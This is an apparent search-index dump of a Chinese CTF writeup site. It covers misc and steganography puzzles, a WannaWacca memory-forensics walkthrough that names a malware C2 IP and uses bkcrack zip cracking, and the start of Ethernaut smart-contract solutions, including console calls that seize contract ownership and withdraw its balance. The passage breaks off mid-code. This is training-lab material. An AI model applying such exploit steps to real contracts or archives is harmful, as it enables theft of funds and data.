3\u6761\u62fc\u5728\u4e00\u8d77\u662f\u5b8c\u6574\u7684 Base32 IQYGOM33JUYW4ZLDKI2GM5C7I4YF6QLOMRPVI4TZL5KGK4TSGRZGSYJBPU====== Base32\uff1a D0g3{M1necR4ft_G0_And_Try_Terr4ria!}","title":"Cthulhu Mythos"},{"location":"writeups/d0g3/#lovemath","text":"\u6839\u636e\u9898\u5e72\u53ef\u4ee5\u63a8\u6d4b\u51fa\u8981\u7528\u5230 Tupper's Self-Referential Formula \u5148\u770b\u538b\u7f29\u5305 flag\u649eCRC\u6821\u9a8c \u5bc6\u7801: th1s_Is_Y0ur_pa33w0rd_We1c0m3e \u89e3\u538b\u51fa\u6765\u7684\u56fe\u7247: \u8fd9\u4e2a\u4e22\u8fdb stegsolve \u540e red 0 \u6bd4\u8f83\u8be1\u5f02\uff0c\u6240\u4ee5\u7528 LSB \u9690\u5199\u8bd5\u8bd5 \u5220\u6389\u5f00\u5934\u7684\u810f\u6570\u636e\u5f97\u5230\uff1a \u8fd9\u4e2a\u8f6c\u6587\u5b57\u8f93\u5230 Tupper's Self-Referential Formula \u7684\u5728\u7ebf\u7f51\u7ad9 https://tuppers-formula.ovh/ \u91cc 1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352 D0g3{I_LOV3_math}","title":"lovemath"},{"location":"writeups/d0g3/#cyzcc_loves_lol","text":"\u5f00\u59cb\u662f LOLcode \uff0c\u8f6c\u6362\u5f97\u5230\u538b\u7f29\u5305\u5bc6\u7801 AGdJfpqebmXpptloa \u5f97\u5230\u4e24\u5f20\u56fe\u7247\uff0c\u4e00\u5f20\u540d\u5b57\u662f jinx's_flag_in_silent.jpg \u63a8\u6d4b\u662f\u7528\u4e86 SilentEye \u8fd9\u4e2a\u8f6f\u4ef6\u85cf\u4e86 flag\uff0c\u9700\u8981\u4e00\u4e2a\u5bc6\u7801 \u7b2c\u4e8c\u4e2a\u56fe\u7247\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u50cf\u7d20\u56fe\uff0c\u8f93\u51fa\u4e86\u4e00\u4e0b\uff0c\u989c\u8272\u4e00\u5171\u6709 10 \u79cd\uff1a #800000FF #008000FF #000000FF #0000FFFF #FFFF00FF #00FFFFFF #FF0000FF #00FF00FF #008080FF #808000FF \u6240\u4ee5\u5e94\u8be5\u662f Brainloller \u800c\u4e0d\u662f Piet\uff0c\u4ece\u5728\u7ebf\u7f51\u7ad9 https://minond.xyz/brainloller/ \u6216\u8005\u5199\u4ee3\u7801\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230 brainfuck \u4ee3\u7801 Brainloller\u89e3\u91ca\u5668 from PIL import Image import sys def Brainloller ( filename ): source = Image . open ( filename ) . convert ( \"RGB\" ) width , height = source . size result = '' ptr = ( 0 , 0 ) direction = 0 while True : if ptr [ 0 ] >= height or ptr [ 0 ] < 0 or ptr [ 1 ] >= width or ptr [ 1 ] < 0 : break else : color = source . getpixel (( ptr [ 1 ], ptr [ 0 ])) if color == ( 255 , 0 , 0 ): result += '>' elif color == ( 128 , 0 , 0 ): result += '<' elif color == ( 0 , 255 , 0 ): result += '+' elif color == ( 0 , 128 , 0 ): result += '-' elif color == ( 0 , 0 , 255 ): result += '.' elif color == ( 0 , 0 , 128 ): result += ',' elif color == ( 255 , 255 , 0 ): result += '[' elif color == ( 128 , 128 , 0 ): result += ']' elif color == ( 0 , 255 , 255 ): direction = ( direction + 1 ) % 4 elif color == ( 0 , 128 , 128 ): direction = ( direction - 1 ) % 4 else : print ( f \"[-] Unknown color: { color } \" ) if direction == 0 : ptr = ptr [ 0 ], ptr [ 1 ] + 1 elif direction == 1 : ptr = ptr [ 0 ] + 1 , ptr [ 1 ] elif direction == 2 : ptr = ptr [ 0 ], ptr [ 1 ] - 1 elif direction == 3 : ptr = ptr [ 0 ] - 1 , ptr [ 1 ] print ( f \"[+] BrainFuck Code: { result } \" ) return result def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : Brainfuck ( Brainloller ( sys . argv [ 1 ])) -+++++++-+ [ < ++++++++ > - ] < . > +++++++ [ < ++++ > - ] < + . +++++++ .. +++ . >>> ++++++++ [ < ++++ > - ] < . >>> ++++++++++ [ < ++++-++++ > - ] < --- . <<<< . +++ . -+---- . -------- . >> + . \u53ef\u4ee5\u53d1\u73b0\u5b83\u5728\u524d\u9762\u4f1a\u628a\u6307\u9488\u5de6\u79fb\u4e00\u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u628a bf \u89e3\u91ca\u5668\u7684 cell \u7684\u521d\u59cb\u6307\u9488\u53f3\u79fb\u4e00\u4f4d\uff08\u6216\u8005\u5728 bf \u4ee3\u7801\u5f00\u5934\u52a0\u4e00\u4e2a > \uff09 \u5f97\u5230\u5bc6\u7801\uff1a 0MTTW_CWZVN! \u7136\u540e\u7528 SilentEye \u89e3\u5bc6\u90a3\u5f20\u56fe\u7247\u5f97\u5230 flag\uff1a D0g3{544f3225-bbaf-47dc-ba8d-5bda54cbaecb}","title":"CyzCC_loves_LOL"},{"location":"writeups/d3ctf2022/","text":"D 3 CTF 2022 Writeup \u00b6 Abstract D 3 \uff08Vidar\u3001L\u3001CNSS\uff09\u548c AntSRC \u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u9898\u76ee\u8f83\u5c11\uff0c\u4f46\u96be\u5ea6\u4e0d\u4f4e BadW3ter \u00b6 \u6587\u4ef6\u5934\uff1a \u5c06 CUY1nw31lai \u6539\u4e3a RIFFWAVEfmt \u5c31\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00\u64ad\u653e \u7531\u9898\u76ee\u4e2d deeper and deeper \u63a8\u6d4b\u4f7f\u7528 deepsound \u8fdb\u884c\u9690\u5199 \u4f7f\u7528 deepsound \u914d\u5408 CUY1nw31lai \u5bc6\u7801\u5f97\u5230 \u660e\u663e\u662f\u53e0\u52a0\u540e\u7684\u574f\u6389\u7684\u4e8c\u7ef4\u7801\uff0c\u76f4\u63a5\u626b\u63cf Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down \u7531\u4e8e\u662f tiff \u6587\u4ef6\uff0c\u4f1a\u81ea\u5e26\u56fe\u5c42\uff0c\u5220\u6389\u767d\u8272\u80cc\u666f\u56fe\u5c42 \u5957\u7528\u5e7b\u5f71\u5766\u514b\u4ee3\u7801\uff1a import cv2 import numpy as np import argparse if __name__ == '__main__' : parser = argparse . ArgumentParser ( description = '\u63d0\u53d6\u5e7b\u5f71\u5766\u514b' ) parser . add_argument ( 'input' , help = '\u8f93\u5165\u56fe' ) parser . add_argument ( 'output1' , help = '\u8f93\u51fa\u9690\u85cf\u7684\u56fe' ) parser . add_argument ( 'output2' , help = '\u8f93\u51fa\u76f4\u63a5\u5c55\u793a\u7684\u56fe' ) arg = parser . parse_args () img_in = cv2 . imread ( arg . input , cv2 . IMREAD_UNCHANGED ) if len ( img_in . shape ) < 3 or img_in . shape [ 2 ] != 4 : parser . error ( '\u4f60\u7684\u56fe\u7247\u4e0d\u542balpha\u901a\u9053\uff01' ) b = img_in [:, :, 0 ] . astype ( np . float ) g = img_in [:, :, 1 ] . astype ( np . float ) r = img_in [:, :, 2 ] . astype ( np . float ) a = img_in [:, :, 3 ] . astype ( np . float ) out1 = np . zeros ([ img_in . shape [ 0 ], img_in . shape [ 1 ], 3 ]) out2 = np . zeros ([ img_in . shape [ 0 ], img_in . shape [ 1 ], 3 ]) out1 [:, :, 0 ] = b * a / 255 out1 [:, :, 1 ] = g * a / 255 out1 [:, :, 2 ] = r * a / 255 out2 [:, :, 0 ] = 255 - ( 255 - b ) * a / 255 out2 [:, :, 1 ] = 255 - ( 255 - g ) * a / 255 out2 [:, :, 2 ] = 255 - ( 255 - r ) * a / 255 out1 = np . clip ( np . floor ( out1 ), 0 , 255 ) . astype ( np . uint8 ) out2 = np . clip ( np . floor ( out2 ), 0 , 255 ) . astype ( np . uint8 ) cv2 . imwrite ( arg . output1 , out1 ) cv2 . imwrite ( arg . output2 , out2 ) \u5f97\u5230 \uff08\u6216\u8005\u76f4\u63a5\u5728 PS \u91cc\u6539\u80cc\u666f\uff09 \u53ef\u4ee5\u626b\u63cf\u51fa flag\uff1a D3CTF{M1r@9e_T@nK_1s_Om0sh1roiii1111!!!!!Isn't_1t?} WannaWacca \u00b6 \u4f7f\u7528 Volatility \u5de5\u5177\u83b7\u53d6\u4e3b\u673a\u4fe1\u606f\uff0c\u901a\u8fc7 netscan \u547d\u4ee4\u83b7\u53d6\u6076\u610f\u8f6f\u4ef6\u8fdb\u7a0b\u53f7 1404 vol . py - f d3 - win7 - 5 f799647 . vmem -- profile = Win7SP0x64 netscan vol . py - f d3 - win7 - 5 f799647 . vmem -- profile = Win7SP0x64 dumpfiles - Q 0x000000003dec4a70 -- dump - dir =./ Smart . exe \u5f97\u5230 SmartFalcon.exe \u8fdb\u884c upx \u8131\u58f3\uff0c\u4e4b\u540e\u518d\u4fee\u6539\u6076\u610f\u8f6f\u4ef6\u7684 ip (114.116.210.244) \u4fe1\u606f\u5230\u81ea\u5df1\u4e3b\u673a\uff0c\u901a\u8fc7\u7ed9\u7684 pcap \u6d41\u91cf\u91cd\u653e\u6d41\u91cf\u5bf9\u538b\u7f29\u7684 flag.zip \u8fdb\u884c\u89e3\u538b \u5bf9\u89e3\u5bc6\u540e\u7684 flag.zip \u7528 bkcrack \u901a\u8fc7 png \u6587\u4ef6\u5934\u8fdb\u884c\u5df2\u77e5\u660e\u6587\u653b\u51fb\uff0c\u5f97\u5230 key\uff1abd363f25 3a7da3aa 4bbe3175\uff0c\u89e3\u538b flag.zip \u5f97\u5230\u4e0b\u56fe\uff1a \u660e\u663e\u7684\u5f69\u8272\u6a2a\u6761\u548c\u80cc\u666f\u82f9\u679c\u6697\u793a\uff0c\u5728\u82f9\u679c\u7684 png \u89e3\u6790\u4e2d\u4f1a\u5448\u73b0\u4e0d\u540c\u7684\u56fe\u50cf\uff1a \u5206\u522b\u53d1\u73b0\u4e0a\u8fb9\u548c\u53f3\u4e0b\u89d2\u6709\u610f\u4e49\u4e0d\u660e\u7684\u767d\u8272\u50cf\u7d20\u70b9 \u518d\u7531\u6587\u4ef6\u540d I can\u2019t see any light \u53ef\u4ee5\u63a8\u6d4b\u662f\u76f2\u6587\uff0c\u5e76\u4e14\u7279\u5f81\u660e\u663e\u53ef\u4ee5\u7ffb\u8bd1 \u4e0a\u8fb9\u7684\u5f00\u5934\u5c31\u662f\u4e00\u4e2a\u6570\u5b57\u6807\u8bc6\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u4e00\u70b9\u53d1\u73b0\u662f 504B0304\uff0czip \u6587\u4ef6\u5934\uff0c\u5168\u90e8\u8bfb\u53d6\uff1a import numpy as np from PIL import Image img = Image . open ( \"braille.png\" ) width , height = size = img . size arr = np . array ( img ) BLACK = np . array ([ 0 , 0 , 0 , 255 ]) WHITE = np . array ([ 255 , 255 , 255 , 255 ]) B00 = np . array ([ BLACK , BLACK ]) B01 = np . array ([ BLACK , WHITE ]) B10 = np . array ([ WHITE , BLACK ]) B11 = np . array ([ WHITE , WHITE ]) num_flag = 0 def convert ( code ): global num_flag if ( code == np . array ([ B01 , B01 , B11 ])) . all (): num_flag = 1 return \"num\" if ( code == np . array ([ B10 , B00 , B00 ])) . all (): if num_flag : num_flag = 0 return \"1\" else : return \"a\" if ( code == np . array ([ B10 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"2\" else : return \"b\" if ( code == np . array ([ B11 , B00 , B00 ])) . all (): if num_flag : num_flag = 0 return \"3\" else : return \"c\" if ( code == np . array ([ B11 , B01 , B00 ])) . all (): if num_flag : num_flag = 0 return \"4\" else : return \"d\" if ( code == np . array ([ B10 , B01 , B00 ])) . all (): if num_flag : num_flag = 0 return \"5\" else : return \"e\" if ( code == np . array ([ B11 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"6\" else : return \"f\" if ( code == np . array ([ B11 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"7\" else : return \"g\" if ( code == np . array ([ B10 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"8\" else : return \"h\" if ( code == np . array ([ B01 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"9\" else : return \"i\" if ( code == np . array ([ B01 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"0\" else : return \"j\" for i in range ( 4 ): for j in range ( 960 ): now = arr [ i * 3 : i * 3 + 3 , j * 2 : j * 2 + 2 ] res = convert ( now ) if res != \"num\" and res != None : print ( res , end = \"\" ) \u7c98\u8d34\u5165 Hex Fiend\uff0c\u89e3\u538b\u5f97\u5230 Future will lead.txt \u6587\u4ef6\uff0c\u662f The Ray of Light \u6b4c\u8bcd\u6df7\u5165\u4e86\u4e00\u4e9b 0x7F \u5b57\u7b26 \u82f9\u679c\u89e3\u91ca\u5668\u53f3\u4e0b\u89d2\u7684\u5185\u5bb9\u76f4\u63a5\u8bfb\u53d6\u65e0\u6cd5\u8bfb\u51fa\u6709\u6548\u5185\u5bb9\uff0c\u8003\u8651\u7ffb\u8f6c 180 \u5ea6\u4ece\u5de6\u5230\u53f3\u8bfb\u53d6\uff0c\u53d1\u73b0\u5927\u5199\u6807\u8bc6\uff0c\u5e76\u4e14\u53ef\u4ee5\u6b63\u5e38\u8bfb\u53d6 \u4eba\u5de5\u8bfb\u53d6\uff1a VGV4dF9ibGluZF93YXRlcm1hcmsgcHdkIGlzOiBSQHkwZjEhOWh0 base64\u89e3\u7801\uff1a Text_blind_watermark pwd is: R@y0f1!9ht guofei9987/text_blind_watermark from text_blind_watermark import extract print ( f \"d3ctf {{ { extract ( open ( 'Future will lead.txt' , 'r' ) . read (), 'R@y0f1!9ht' ) . strip () } }} \" ) flag: d3ctf{b576241258a44b868ea25804b0ec1d4e}","title":"D3CTF 2022"},{"location":"writeups/d3ctf2022/#d3ctf-2022-writeup","text":"Abstract D 3 \uff08Vidar\u3001L\u3001CNSS\uff09\u548c AntSRC \u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u9898\u76ee\u8f83\u5c11\uff0c\u4f46\u96be\u5ea6\u4e0d\u4f4e","title":"D3CTF 2022 Writeup"},{"location":"writeups/d3ctf2022/#badw3ter","text":"\u6587\u4ef6\u5934\uff1a \u5c06 CUY1nw31lai \u6539\u4e3a RIFFWAVEfmt \u5c31\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00\u64ad\u653e \u7531\u9898\u76ee\u4e2d deeper and deeper \u63a8\u6d4b\u4f7f\u7528 deepsound \u8fdb\u884c\u9690\u5199 \u4f7f\u7528 deepsound \u914d\u5408 CUY1nw31lai \u5bc6\u7801\u5f97\u5230 \u660e\u663e\u662f\u53e0\u52a0\u540e\u7684\u574f\u6389\u7684\u4e8c\u7ef4\u7801\uff0c\u76f4\u63a5\u626b\u63cf Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down Never gonna give you up Never gonna let you down \u7531\u4e8e\u662f tiff \u6587\u4ef6\uff0c\u4f1a\u81ea\u5e26\u56fe\u5c42\uff0c\u5220\u6389\u767d\u8272\u80cc\u666f\u56fe\u5c42 \u5957\u7528\u5e7b\u5f71\u5766\u514b\u4ee3\u7801\uff1a import cv2 import numpy as np import argparse if __name__ == '__main__' : parser = argparse . ArgumentParser ( description = '\u63d0\u53d6\u5e7b\u5f71\u5766\u514b' ) parser . add_argument ( 'input' , help = '\u8f93\u5165\u56fe' ) parser . add_argument ( 'output1' , help = '\u8f93\u51fa\u9690\u85cf\u7684\u56fe' ) parser . add_argument ( 'output2' , help = '\u8f93\u51fa\u76f4\u63a5\u5c55\u793a\u7684\u56fe' ) arg = parser . parse_args () img_in = cv2 . imread ( arg . input , cv2 . IMREAD_UNCHANGED ) if len ( img_in . shape ) < 3 or img_in . shape [ 2 ] != 4 : parser . error ( '\u4f60\u7684\u56fe\u7247\u4e0d\u542balpha\u901a\u9053\uff01' ) b = img_in [:, :, 0 ] . astype ( np . float ) g = img_in [:, :, 1 ] . astype ( np . float ) r = img_in [:, :, 2 ] . astype ( np . float ) a = img_in [:, :, 3 ] . astype ( np . float ) out1 = np . zeros ([ img_in . shape [ 0 ], img_in . shape [ 1 ], 3 ]) out2 = np . zeros ([ img_in . shape [ 0 ], img_in . shape [ 1 ], 3 ]) out1 [:, :, 0 ] = b * a / 255 out1 [:, :, 1 ] = g * a / 255 out1 [:, :, 2 ] = r * a / 255 out2 [:, :, 0 ] = 255 - ( 255 - b ) * a / 255 out2 [:, :, 1 ] = 255 - ( 255 - g ) * a / 255 out2 [:, :, 2 ] = 255 - ( 255 - r ) * a / 255 out1 = np . clip ( np . floor ( out1 ), 0 , 255 ) . astype ( np . uint8 ) out2 = np . clip ( np . floor ( out2 ), 0 , 255 ) . astype ( np . uint8 ) cv2 . imwrite ( arg . output1 , out1 ) cv2 . imwrite ( arg . output2 , out2 ) \u5f97\u5230 \uff08\u6216\u8005\u76f4\u63a5\u5728 PS \u91cc\u6539\u80cc\u666f\uff09 \u53ef\u4ee5\u626b\u63cf\u51fa flag\uff1a D3CTF{M1r@9e_T@nK_1s_Om0sh1roiii1111!!!!!Isn't_1t?}","title":"BadW3ter"},{"location":"writeups/d3ctf2022/#wannawacca","text":"\u4f7f\u7528 Volatility \u5de5\u5177\u83b7\u53d6\u4e3b\u673a\u4fe1\u606f\uff0c\u901a\u8fc7 netscan \u547d\u4ee4\u83b7\u53d6\u6076\u610f\u8f6f\u4ef6\u8fdb\u7a0b\u53f7 1404 vol . py - f d3 - win7 - 5 f799647 . vmem -- profile = Win7SP0x64 netscan vol . py - f d3 - win7 - 5 f799647 . vmem -- profile = Win7SP0x64 dumpfiles - Q 0x000000003dec4a70 -- dump - dir =./ Smart . exe \u5f97\u5230 SmartFalcon.exe \u8fdb\u884c upx \u8131\u58f3\uff0c\u4e4b\u540e\u518d\u4fee\u6539\u6076\u610f\u8f6f\u4ef6\u7684 ip (114.116.210.244) \u4fe1\u606f\u5230\u81ea\u5df1\u4e3b\u673a\uff0c\u901a\u8fc7\u7ed9\u7684 pcap \u6d41\u91cf\u91cd\u653e\u6d41\u91cf\u5bf9\u538b\u7f29\u7684 flag.zip \u8fdb\u884c\u89e3\u538b \u5bf9\u89e3\u5bc6\u540e\u7684 flag.zip \u7528 bkcrack \u901a\u8fc7 png \u6587\u4ef6\u5934\u8fdb\u884c\u5df2\u77e5\u660e\u6587\u653b\u51fb\uff0c\u5f97\u5230 key\uff1abd363f25 3a7da3aa 4bbe3175\uff0c\u89e3\u538b flag.zip \u5f97\u5230\u4e0b\u56fe\uff1a \u660e\u663e\u7684\u5f69\u8272\u6a2a\u6761\u548c\u80cc\u666f\u82f9\u679c\u6697\u793a\uff0c\u5728\u82f9\u679c\u7684 png \u89e3\u6790\u4e2d\u4f1a\u5448\u73b0\u4e0d\u540c\u7684\u56fe\u50cf\uff1a \u5206\u522b\u53d1\u73b0\u4e0a\u8fb9\u548c\u53f3\u4e0b\u89d2\u6709\u610f\u4e49\u4e0d\u660e\u7684\u767d\u8272\u50cf\u7d20\u70b9 \u518d\u7531\u6587\u4ef6\u540d I can\u2019t see any light \u53ef\u4ee5\u63a8\u6d4b\u662f\u76f2\u6587\uff0c\u5e76\u4e14\u7279\u5f81\u660e\u663e\u53ef\u4ee5\u7ffb\u8bd1 \u4e0a\u8fb9\u7684\u5f00\u5934\u5c31\u662f\u4e00\u4e2a\u6570\u5b57\u6807\u8bc6\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u4e00\u70b9\u53d1\u73b0\u662f 504B0304\uff0czip \u6587\u4ef6\u5934\uff0c\u5168\u90e8\u8bfb\u53d6\uff1a import numpy as np from PIL import Image img = Image . open ( \"braille.png\" ) width , height = size = img . size arr = np . array ( img ) BLACK = np . array ([ 0 , 0 , 0 , 255 ]) WHITE = np . array ([ 255 , 255 , 255 , 255 ]) B00 = np . array ([ BLACK , BLACK ]) B01 = np . array ([ BLACK , WHITE ]) B10 = np . array ([ WHITE , BLACK ]) B11 = np . array ([ WHITE , WHITE ]) num_flag = 0 def convert ( code ): global num_flag if ( code == np . array ([ B01 , B01 , B11 ])) . all (): num_flag = 1 return \"num\" if ( code == np . array ([ B10 , B00 , B00 ])) . all (): if num_flag : num_flag = 0 return \"1\" else : return \"a\" if ( code == np . array ([ B10 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"2\" else : return \"b\" if ( code == np . array ([ B11 , B00 , B00 ])) . all (): if num_flag : num_flag = 0 return \"3\" else : return \"c\" if ( code == np . array ([ B11 , B01 , B00 ])) . all (): if num_flag : num_flag = 0 return \"4\" else : return \"d\" if ( code == np . array ([ B10 , B01 , B00 ])) . all (): if num_flag : num_flag = 0 return \"5\" else : return \"e\" if ( code == np . array ([ B11 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"6\" else : return \"f\" if ( code == np . array ([ B11 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"7\" else : return \"g\" if ( code == np . array ([ B10 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"8\" else : return \"h\" if ( code == np . array ([ B01 , B10 , B00 ])) . all (): if num_flag : num_flag = 0 return \"9\" else : return \"i\" if ( code == np . array ([ B01 , B11 , B00 ])) . all (): if num_flag : num_flag = 0 return \"0\" else : return \"j\" for i in range ( 4 ): for j in range ( 960 ): now = arr [ i * 3 : i * 3 + 3 , j * 2 : j * 2 + 2 ] res = convert ( now ) if res != \"num\" and res != None : print ( res , end = \"\" ) \u7c98\u8d34\u5165 Hex Fiend\uff0c\u89e3\u538b\u5f97\u5230 Future will lead.txt \u6587\u4ef6\uff0c\u662f The Ray of Light \u6b4c\u8bcd\u6df7\u5165\u4e86\u4e00\u4e9b 0x7F \u5b57\u7b26 \u82f9\u679c\u89e3\u91ca\u5668\u53f3\u4e0b\u89d2\u7684\u5185\u5bb9\u76f4\u63a5\u8bfb\u53d6\u65e0\u6cd5\u8bfb\u51fa\u6709\u6548\u5185\u5bb9\uff0c\u8003\u8651\u7ffb\u8f6c 180 \u5ea6\u4ece\u5de6\u5230\u53f3\u8bfb\u53d6\uff0c\u53d1\u73b0\u5927\u5199\u6807\u8bc6\uff0c\u5e76\u4e14\u53ef\u4ee5\u6b63\u5e38\u8bfb\u53d6 \u4eba\u5de5\u8bfb\u53d6\uff1a VGV4dF9ibGluZF93YXRlcm1hcmsgcHdkIGlzOiBSQHkwZjEhOWh0 base64\u89e3\u7801\uff1a Text_blind_watermark pwd is: R@y0f1!9ht guofei9987/text_blind_watermark from text_blind_watermark import extract print ( f \"d3ctf {{ { extract ( open ( 'Future will lead.txt' , 'r' ) . read (), 'R@y0f1!9ht' ) . strip () } }} \" ) flag: d3ctf{b576241258a44b868ea25804b0ec1d4e}","title":"WannaWacca"},{"location":"writeups/ethernaut/","text":"Ethernaut Writeups \u00b6 Abstract https://ethernaut.openzeppelin.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55 \u524d\u7f6e\u6b65\u9aa4\uff1a \u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237 \u8fde\u63a5\u5230 Rinkeby \u6d4b\u8bd5\u7f51\u7edc \u901a\u8fc7 https://faucet.rinkeby.io/ \u6216\u8005 https://faucets.chain.link/rinkeby \u641e\u70b9\u6d4b\u8bd5\u5e01\uff08\u4e3b\u8981\u7528\u6765\u540e\u7eed\u652f\u4ed8 gas\uff09 \u5728 ethernaut \u4e0a\u8fde\u63a5 MetaMask \u6bcf\u4e00\u9053\u9898\u76ee\u5148\u751f\u6210\u65b0\u5b9e\u4f8b\uff0c\u5728 console \u4e2d\u5b8c\u6210\u540e\u63d0\u4ea4\u5b9e\u4f8b Hello Ethernaut \u00b6 \u6309\u7167\u9898\u76ee\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u8c03\u7528\u51fd\u6570\u5373\u53ef Fallback \u00b6 \u7ed9\u4e86\u5408\u7ea6\u6e90\u7801 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Fallback { using SafeMath for uint256 ; mapping ( address => uint ) public contributions ; address payable public owner ; constructor () public { owner = msg.sender ; contributions [ msg.sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function contribute () public payable { require ( msg.value < 0 . 001 ether ); contributions [ msg.sender ] += msg.value ; if ( contributions [ msg.sender ] > contributions [ owner ]) { owner = msg.sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg.sender ]; } function withdraw () public onlyOwner { owner . transfer ( address ( this ). balance ); } receive () external payable { require ( msg.value > 0 && contributions [ msg.sender ] > 0 ); owner = msg.sender ; } } \u76ee\u6807\u662f\u62ff\u5230\u8fd9\u4e2a\u5408\u7ea6\u7684\u63a7\u5236\u6743\uff0c\u8f6c\u51fa\u6240\u6709\u4f59\u989d \u4e3b\u8981\u903b\u8f91\u662f contribute \u51fd\u6570\u4f1a\u589e\u52a0\u8c03\u7528\u8005\u7684 contributions\uff0c\u5f53\u5927\u4e8e 1000 ether \u7684\u65f6\u5019\uff0c\u4f1a\u628a\u6240\u6709\u6743\u8f6c\u7ed9\u73a9\u5bb6\u3002\u901a\u8fc7\u8fd9\u4e2a\u6765\u83b7\u5f97\u63a7\u5236\u6743\u662f\u4e0d\u73b0\u5b9e\u7684 \u800c\u53e6\u4e00\u4e2a\u4f1a\u53d1\u751f\u6240\u6709\u6743\u8f6c\u6362\u7684\u51fd\u6570\u662f receive \u51fd\u6570\uff0c\u8fd9\u662f\u4e00\u4e2a fallback \u51fd\u6570\uff0c\u4f1a\u5728\u5408\u7ea6\u8d26\u6237\u63a5\u6536\u4ee5\u592a\u5e01\u7684\u65f6\u5019\u89e6\u53d1\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u53ea\u8981\u5411\u5408\u7ea6\u53d1\u51fa\u5e26\u6709\u4ee5\u592a\u5e01\u7684\u4ea4\u6613\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u51fd\u6570\u8f6c\u79fb\u6240\u6709\u6743 \u800c\u4e4b\u524d\u8fd8\u9700\u8981\u5148\u4fdd\u8bc1 contributions \u5927\u4e8e 0\uff0c\u6240\u4ee5\u89e3\u6cd5\uff1a > contract . contribute ({ value : 1 }) // \u4f7f contributions \u5927\u4e8e 0 > contract . sendTransaction ({ value : 1 }) // \u89e6\u53d1 fallback \u8f6c\u79fb\u6240\u6709\u6743 > contract . withdraw () // \u8f6c\u51fa\u6240\u6709\u4f59\u989d Fallout \u00b6 \u8981\u6c42\u5f97\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743 \u6839\u636e\u5408\u7ea6\u6e90\u7801\u53ef\u4ee5\u53d1\u73b0\u5b83\u7684 constructor \u7684\u51fd\u6570\u540d\u4e3a Fal1out\uff0c\u5e76\u4e0d\u662f\u5408\u7ea6\u540d Fallout\uff0c\u6709 l1 \u7684\u5dee\u522b \u6240\u4ee5\u76f4\u63a5\u8c03\u7528 contract.Fal1out() \u5c31\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u62ff\u5230\u5408\u7ea6\u6240\u6709\u6743 Coin Flip \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract CoinFlip { using SafeMath for uint256 ; uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () public { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number . sub 